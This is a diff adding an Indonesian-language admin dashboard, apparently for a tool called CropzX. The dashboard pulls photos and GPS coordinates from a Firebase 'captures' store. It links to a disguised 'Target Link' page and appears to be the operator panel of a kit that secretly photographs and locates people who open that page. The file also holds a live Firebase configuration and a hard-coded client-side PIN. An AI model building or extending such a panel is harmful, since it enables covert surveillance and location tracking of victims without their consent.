@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>CropzX admin</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap');
+
+  :root {
+    --bg-dark: #121212;
+    --card-bg: #1f1f1f;
+    --text-light: #e0e0e0;
+    --accent: #4caf50;
+    --btn-danger: #e53935;
+    --btn-danger-hover: #b71c1c;
+    --btn-download: #2196F3;
+    --btn-download-hover: #0b7dda;
+    --shadow: rgba(0,0,0,0.8);
+  }
+
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    margin: 0;
+    font-family: 'Poppins', sans-serif;
+    background: var(--bg-dark);
+    color: var(--text-light);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  header {
+    padding: 1rem 2rem;
+    font-weight: 600;
+    font-size: 1.7rem;
+    letter-spacing: 0.05em;
+    border-bottom: 1px solid #333;
+    text-align: center;
+    user-select: none;
+    background: linear-gradient(90deg, #1a5f1a, #4caf50);
+    color: white;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .menu-btn {
+    font-size: 1.5rem;
+    cursor: pointer;
+    padding: 0.5rem;
+  }
+
+  .sidebar {
+    position: fixed;
+    top: 0;
+    left: -250px;
+    width: 250px;
+    height: 100%;
+    background: var(--card-bg);
+    transition: all 0.3s ease;
+    z-index: 1001;
+    box-shadow: 2px 0 10px rgba(0,0,0,0.5);
+  }
+
+  .sidebar.active {
+    left: 0;
+  }
+
+  .sidebar-menu {
+    padding: 1rem;
+  }
+
+  .sidebar-menu a {
+    display: block;
+    color: var(--text-light);
+    text-decoration: none;
+    padding: 0.8rem 1rem;
+    margin-bottom: 0.5rem;
+    border-radius: 5px;
+    transition: background 0.3s;
+  }
+
+  .sidebar-menu a:hover {
+    background: rgba(255,255,255,0.1);
+  }
+
+  .sidebar-menu a i {
+    margin-right: 10px;
+  }
+
+  .sidebar-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.5);
+    z-index: 1000;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease;
+  }
+
+  .sidebar-overlay.active {
+    opacity: 1;
+    pointer-events: all;
+  }
+
+  main {
+    flex: 1;
+    padding: 1.5rem;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 1.3rem;
+    overflow-y: auto;
+  }
+
+  .card {
+    background: var(--card-bg);
+    border-radius: 8px;
+    box-shadow: 0 4px 12px var(--shadow);
+    display: flex;
+    flex-direction: column;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    cursor: default;
+    animation: fadeInUp 0.5s ease forwards;
+    opacity: 0;
+    overflow: hidden;
+    height: fit-content;
+  }
+  .card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 20px var(--shadow);
+  }
+
+  .img-container {
+    width: 100%;
+    aspect-ratio: 4/3;
+    overflow: hidden;
+    position: relative;
+  }
+
+  .img-container img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transition: transform 0.3s ease;
+    pointer-events: none;
+    user-select: none;
+    -webkit-user-drag: none;
+  }
+  .card:hover .img-container img {
+    transform: scale(1.05);
+  }
+
+  .img-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.3);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+  }
+  .card:hover .img-overlay {
+    opacity: 1;
+  }
+  .img-overlay span {
+    color: white;
+    background: rgba(0,0,0,0.7);
+    padding: 0.5rem 1rem;
+    border-radius: 20px;
+    font-size: 0.9rem;
+  }
+
+  .info {
+    padding: 0.8rem;
+    display: flex;
+    flex-direction: column;
+    gap: 0.5rem;
+  }
+
+  .details {
+    font-size: 0.85rem;
+    color: #bbb;
+    line-height: 1.3;
+    word-break: break-word;
+  }
+
+  .details strong {
+    color: var(--accent);
+  }
+
+  .location {
+    font-size: 0.8rem;
+    color: #888;
+  }
+
+  .location a {
+    color: #4caf50;
+    text-decoration: none;
+    font-style: italic;
+  }
+
+  .location a:hover {
+    text-decoration: underline;
+  }
+
+  .card-actions {
+    display: flex;
+    gap: 0.5rem;
+    margin-top: 0.5rem;
+  }
+
+  .card-btn {
+    border: none;
+    color: white;
+    font-weight: 600;
+    border-radius: 5px;
+    padding: 0.4rem 0.8rem;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    font-size: 0.8rem;
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.3rem;
+  }
+
+  .card-btn i {
+    font-size: 0.9rem;
+  }
+
+  .download-btn {
+    background: var(--btn-download);
+  }
+  .download-btn:hover {
+    background: var(--btn-download-hover);
+  }
+
+  .delete-btn {
+    background: var(--btn-danger);
+  }
+  .delete-btn:hover {
+    background: var(--btn-danger-hover);
+  }
+
+  footer {
+    padding: 0.7rem;
+    font-size: 0.8rem;
+    color: #555;
+    border-top: 1px solid #333;
+    text-align: center;
+  }
+
+  .no-data {
+    grid-column: 1/-1;
+    text-align: center;
+    font-size: 1.1rem;
+    font-weight: 500;
+    color: #777;
+    margin-top: 3rem;
+    user-select: none;
+  }
+
+  .pin-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.7);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease;
+  }
+
+  .pin-modal.active {
+    opacity: 1;
+    pointer-events: all;
+  }
+
+  .pin-container {
+    background: var(--card-bg);
+    padding: 1.5rem;
+    border-radius: 8px;
+    width: 90%;
+    max-width: 350px;
+    text-align: center;
+  }
+
+  .pin-container h3 {
+    margin-top: 0;
+    margin-bottom: 0.5rem;
+    color: var(--accent);
+    font-size: 1.2rem;
+  }
+
+  .pin-desc {
+    font-size: 0.9rem;
+    color: #aaa;
+    margin-bottom: 1rem;
+  }
+
+  .pin-input {
+    width: 100%;
+    padding: 0.7rem;
+    margin-bottom: 1rem;
+    border-radius: 5px;
+    border: 2px solid #333;
+    background: #2a2a2a;
+    color: white;
+    font-size: 1.1rem;
+    text-align: center;
+    letter-spacing: 0.2em;
+  }
+
+  .pin-buttons {
+    display: flex;
+    justify-content: space-between;
+    gap: 0.8rem;
+  }
+
+  .pin-buttons button {
+    flex: 1;
+    padding: 0.7rem;
+    border: none;
+    border-radius: 5px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s ease;
+    font-size: 0.9rem;
+  }
+
+  .pin-confirm {
+    background: var(--accent);
+    color: white;
+  }
+
+  .pin-cancel {
+    background: #555;
+    color: white;
+  }
+
+  .pin-error {
+    color: var(--btn-danger);
+    font-size: 0.85rem;
+    margin-bottom: 0.5rem;
+    min-height: 1.2rem;
+  }
+
+  @keyframes fadeInUp {
+    from {
+      opacity: 0;
+      transform: translateY(15px);
+    } to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  /* Loading animation */
+  .loading-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 2000;
+  }
+
+  .loading-animation {
+    position: relative;
+    width: 100px;
+    height: 100px;
+  }
+
+  .loading-animation .diamond {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    border: 4px solid transparent;
+    border-top-color: #4caf50;
+    border-bottom-color: #4caf50;
+    border-radius: 50%;
+    animation: rotateDiamond 2s linear infinite;
+  }
+
+  .loading-animation .diamond:nth-child(1) {
+    animation-delay: 0.5s;
+  }
+
+  .loading-animation .diamond:nth-child(2) {
+    animation-delay: 1s;
+  }
+
+  .loading-animation .letter {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 2rem;
+    font-weight: bold;
+    color: #4caf50;
+  }
+
+  @keyframes rotateDiamond {
+    0% {
+      transform: rotate(0deg);
+      border-top-color: #4caf50;
+      border-bottom-color: #4caf50;
+    }
+    50% {
+      border-top-color: #2196F3;
+      border-bottom-color: #2196F3;
+    }
+    100% {
+      transform: rotate(360deg);
+      border-top-color: #4caf50;
+      border-bottom-color: #4caf50;
+    }
+  }
+</style>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+<header>
+  <div class="menu-btn" id="menuBtn">
+    <i class="fas fa-bars"></i>
+  </div>
+  <div>CropzX - BY Warz Gambar X Lokas</div>
+  <div style="width: 40px;"></div> <!-- Spacer for alignment -->
+</header>
+
+<!-- Sidebar -->
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-menu">
+    <a href="#" id="homeLink"><i class="fas fa-home"></i> Home</a>
+    <a href="https://wa.me/6282130858301" target="_blank"><i class="fab fa-whatsapp"></i> Support WA</a>
+    <a href="https://kemekempk.github.io/Event-Ambyar-2025/ kemem.html" target="_blank"><i class="fas fa-link"></i> Target Link</a>
+  </div>
+</div>
+<div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+<main id="container">
+  <!-- Cards will be appended here -->
+</main>
+<footer>
+  &copy; 2025 Satu CropzX - Ambil gambar and lokasi 🌐
+</footer>
+
+<!-- Loading Animation -->
+<div class="loading-container" id="loadingContainer">
+  <div class="loading-animation">
+    <div class="diamond"></div>
+    <div class="diamond"></div>
+    <div class="letter">W</div>
+  </div>
+</div>
+
+<!-- PIN Verification Modal -->
+<div class="pin-modal" id="pinModal">
+  <div class="pin-container">
+    <h3 id="pinTitle">Verifikasi PIN</h3>
+    <p class="pin-desc" id="pinDesc">Masukkan PIN untuk melanjutkan</p>
+    <input type="password" class="pin-input" id="pinInput" maxlength="4" placeholder="****">
+    <div class="pin-error" id="pinError"></div>
+    <div class="pin-buttons">
+      <button class="pin-cancel" id="pinCancel">Batal</button>
+      <button class="pin-confirm" id="pinConfirm">Konfirmasi</button>
+    </div>
+  </div>
+</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+<script>
+  // Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyDCfNezdoQRgxkd1HOYUDa2kf9I1Jvx9FI",
+    authDomain: "toko-sya.firebaseapp.com",
+    databaseURL: "https://toko-sya-default-rtdb.firebaseio.com",
+    projectId: "toko-sya",
+    storageBucket: "toko-sya.firebasestorage.app",
+    messagingSenderId: "1025076261422",
+    appId: "1:1025076261422:web:1f6d988205774cceed65bf",
+    measurementId: "G-KSSE7E6R90"
+  };
+
+  // Initialize Firebase
+  const app = firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  const correctPIN = '2903'; // PIN yang benar
+  let currentAction = null; // 'delete' or 'download'
+  let currentEntryId = null;
+  let currentCardElement = null;
+  let currentImageUrl = null;
+
+  function formatTimestamp(ts) {
+    const d = new Date(ts);
+    return d.toLocaleString('id-ID', {
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit'
+    });
+  }
+
+  function createCard(entry) {
+    const {id, image, location, timestamp} = entry;
+
+    const card = document.createElement('div');
+    card.className = 'card';
+
+    const imgCont = document.createElement('div');
+    imgCont.className = 'img-container';
+
+    const img = document.createElement('img');
+    img.src = image;
+    img.alt = 'Gambar yang diambil';
+
+    const imgOverlay = document.createElement('div');
+    imgOverlay.className = 'img-overlay';
+    imgOverlay.innerHTML = '<span>Privet Brow Gunakan Tombol Di bawah ♨️</span>';
+
+    imgCont.appendChild(img);
+    imgCont.appendChild(imgOverlay);
+
+    const info = document.createElement('div');
+    info.className = 'info';
+
+    const details = document.createElement('div');
+    details.className = 'details';
+    details.innerHTML = `<strong>ID:</strong> ${id}<br/>
+                         <strong>Waktu:</strong> ${formatTimestamp(timestamp)}`;
+
+    let locText = 'Lokasi: Tidak tersedia';
+    if (location) {
+      const mapsLink = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
+      locText = `Lokasi: <a href="${mapsLink}" target="_blank" title="Buka di Google Maps">${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)} (±${location.accuracy ? location.accuracy.toFixed(1) + 'm' : 'N/A'})</a>`;
+    }
+
+    const locationEl = document.createElement('div');
+    locationEl.className = 'location';
+    locationEl.innerHTML = locText;
+
+    const actions = document.createElement('div');
+    actions.className = 'card-actions';
+
+    const downloadBtn = document.createElement('button');
+    downloadBtn.className = 'card-btn download-btn';
+    downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download';
+    downloadBtn.title = 'Download gambar';
+    downloadBtn.onclick = () => {
+      currentAction = 'download';
+      currentEntryId = id;
+      currentCardElement = card;
+      currentImageUrl = image;
+      showPinModal('Download Gambar', 'Masukkan PIN untuk download gambar');
+    };
+
+    const deleteBtn = document.createElement('button');
+    deleteBtn.className = 'card-btn delete-btn';
+    deleteBtn.innerHTML = '<i class="fas fa-trash"></i> Hapus';
+    deleteBtn.title = 'Hapus data ini';
+    deleteBtn.onclick = () => {
+      currentAction = 'delete';
+      currentEntryId = id;
+      currentCardElement = card;
+      showPinModal('Hapus Data', 'Masukkan PIN untuk menghapus data');
+    };
+
+    actions.appendChild(downloadBtn);
+    actions.appendChild(deleteBtn);
+
+    info.appendChild(details);
+    info.appendChild(locationEl);
+    info.appendChild(actions);
+
+    card.appendChild(imgCont);
+    card.appendChild(info);
+
+    return card;
+  }
+
+  function showPinModal(title, description) {
+    const modal = document.getElementById('pinModal');
+    const pinTitle = document.getElementById('pinTitle');
+    const pinDesc = document.getElementById('pinDesc');
+    const pinInput = document.getElementById('pinInput');
+    const pinError = document.getElementById('pinError');
+    
+    pinTitle.textContent = title;
+    pinDesc.textContent = description;
+    pinInput.value = '';
+    pinError.textContent = '';
+    modal.classList.add('active');
+    pinInput.focus();
+  }
+
+  function hidePinModal() {
+    const modal = document.getElementById('pinModal');
+    modal.classList.remove('active');
+  }
+
+  function verifyPin() {
+    const pinInput = document.getElementById('pinInput');
+    const pinError = document.getElementById('pinError');
+    
+    if (pinInput.value === correctPIN) {
+      if (currentAction === 'delete') {
+        deleteEntry(currentEntryId, currentCardElement);
+      } else if (currentAction === 'download') {
+        downloadImage(currentImageUrl);
+      }
+      hidePinModal();
+    } else {
+      pinError.textContent = 'PIN salah! Silakan coba lagi.';
+      pinInput.value = '';
+      pinInput.focus();
+    }
+  }
+
+  function downloadImage(imageUrl) {
+    // Create temporary anchor element to trigger download
+    const a = document.createElement('a');
+    a.href = imageUrl;
+    a.download = `satu_cropzx_${currentEntryId}_${Date.now()}.jpg`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+
+  function deleteEntry(id, cardElement) {
+    // Remove from Firebase
+    database.ref('captures/' + id).remove()
+      .then(() => {
+        // Animate removal
+        cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+        cardElement.style.opacity = '0';
+        cardElement.style.transform = 'scale(0.9) translateX(-20px)';
+        setTimeout(() => {
+          cardElement.remove();
+          checkNoData();
+        }, 300);
+      })
+      .catch(error => {
+        console.error('Error removing document: ', error);
+      });
+  }
+
+  function checkNoData() {
+    const container = document.getElementById('container');
+    if (container.children.length === 0) {
+      const msg = document.createElement('div');
+      msg.className = 'no-data';
+      msg.textContent = 'Tidak ada data yang tersedia.';
+      container.appendChild(msg);
+    }
+  }
+
+  function renderData(data) {
+    const container = document.getElementById('container');
+    container.innerHTML = '';
+    
+    if (!data || Object.keys(data).length === 0) {
+      checkNoData();
+      return;
+    }
+    
+    // Convert object to array and sort by timestamp
+    const dataArray = Object.values(data).sort((a, b) => 
+      new Date(b.timestamp) - new Date(a.timestamp)
+    );
+    
+    dataArray.forEach(entry => {
+      const card = createCard(entry);
+      container.appendChild(card);
+    });
+  }
+
+  // Event listeners for PIN modal
+  document.getElementById('pinConfirm').addEventListener('click', verifyPin);
+  document.getElementById('pinCancel').addEventListener('click', hidePinModal);
+  document.getElementById('pinInput').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+      verifyPin();
+    }
+  });
+
+  // Sidebar toggle
+  document.getElementById('menuBtn').addEventListener('click', () => {
+    document.getElementById('sidebar').classList.add('active');
+    document.getElementById('sidebarOverlay').classList.add('active');
+  });
+
+  document.getElementById('sidebarOverlay').addEventListener('click', () => {
+    document.getElementById('sidebar').classList.remove('active');
+    document.getElementById('sidebarOverlay').classList.remove('active');
+  });
+
+  // Prevent image drag/download
+  document.addEventListener('contextmenu', (e) => {
+    if (e.target.tagName === 'IMG') {
+      e.preventDefault();
+    }
+  });
+
+  // Initial render
+  window.onload = () => {
+    // Hide loading after 2 seconds
+    setTimeout(() => {
+      document.getElementById('loadingContainer').style.display = 'none';
+    }, 2000);
+    
+    // Listen for data changes
+    database.ref('captures').on('value', (snapshot) => {
+      const data = snapshot.val();
+      renderData(data);
+    });
+  };
+</script>
+</body>
+</html>
